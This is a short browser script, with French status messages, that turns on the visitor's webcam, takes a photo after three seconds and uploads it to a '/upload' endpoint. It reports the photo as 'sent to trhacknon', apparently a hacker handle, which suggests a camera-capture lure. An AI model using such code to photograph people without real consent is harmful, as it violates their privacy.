const statusText = document.getElementById('status');
const video = document.getElementById('video');

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    statusText.textContent = '🟢 Caméra activée. Capture dans 3 secondes...';

    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);

    setTimeout(() => {
      imageCapture.takePhoto()
        .then(blob => {
          const formData = new FormData();
          formData.append("photo", blob, "photo.jpg");

          fetch("/upload", {
            method: "POST",
            body: formData
          }).then(() => {
            statusText.textContent = '📷 Photo capturée et envoyée à trhacknon.';
          }).catch(err => {
            statusText.textContent = '❌ Erreur envoi photo.';
            console.error(err);
          });
        })
        .catch(err => {
          statusText.textContent = '❌ Erreur capture photo.';
          console.error(err);
        });
    }, 3000);
  })
  .catch(err => {
    statusText.textContent = '❌ Caméra non autorisée ou indisponible.';
    console.error(err);
  });
